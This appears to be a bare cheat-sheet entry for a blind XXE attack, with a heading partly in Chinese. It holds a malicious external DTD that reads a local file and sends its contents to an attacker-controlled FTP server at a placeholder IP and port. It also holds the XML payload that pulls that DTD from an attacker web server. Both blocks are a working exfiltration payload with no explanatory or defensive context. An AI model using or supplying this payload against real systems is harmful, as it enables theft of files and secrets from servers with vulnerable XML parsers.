# dtd 文件
```xml
<!ENTITY % file SYSTEM "file:///<file_path>">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<ip>:<ftp_port>/%file;'>">
%eval;
%exfil;
```

# xxe

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<ip>:<web_port>/data.dtd">
  %xxe;
]>
```
